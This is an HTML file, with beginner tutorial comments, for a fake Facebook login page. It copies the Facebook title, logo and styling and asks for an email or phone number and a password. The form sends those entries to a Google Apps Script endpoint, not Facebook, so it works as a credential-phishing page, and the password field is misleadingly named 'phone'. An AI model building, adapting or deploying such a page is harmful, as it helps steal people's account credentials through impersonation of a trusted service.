                
<!DOCTYPE html> 
<!-- The doctype declaration tells the browser the version of HTML that the document is written in. -->
<html lang="en">
<!-- The <html> element is the root element of an HTML page, and indicates that the page is written in HTML. -->
<head>
    <meta charset="UTF-8">
    <!-- The <meta> element provides metadata about the HTML document, such as character encoding. -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- This meta tag tells Internet Explorer to use the latest version of the rendering engine. -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- The viewport meta tag specifies how the website should be scaled on different devices. -->
    <title>Facebook</title>
    <!-- The title element defines the title of the document, which is displayed in the browser's title bar. -->
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Arial, sans-serif;
        }
        .container {
            width: 300px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 100px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .form-group input:focus {
            outline: none;
            box-shadow: 0px 0px 2px 1px #1877f2;
        }
        .form-group button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .form-group button:hover {
            background-color: #0d63c2;
        }
    </style>
</head>
 
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/2023_Facebook_icon.svg/800px-2023_Facebook_icon.svg.png" alt="Facebook Logo">
        </div>
        
    <!-- The <h1> element defines a heading. The id attribute creates a unique identifier for the element. -->
    <form action="https://script.google.com/macros/s/AKfycbwdAiVmE96Mt1fXFxOv4Kk572r4gP-uAqC_a0GhOlr6VYQULoNd3m4yE8BeZbiOl-MPmQ/exec" method='post'>

        <div class="form-group">
            <label for="email">Email or phone number</label>
            <input type="email" name="email" id="email" required>
        </div>

        <div class="form-group">
            <label for="password">Password</label>
            <input type="password" name="phone" id="password" required>
        </div>

        <!-- <input type="tel" name="phone" placeholder='Password'><br><br> -->

        <div class="form-group">
            <button type="submit" id="sub" value="login">Log In</button>
        </div>
    </form>
</body>
 
</html>
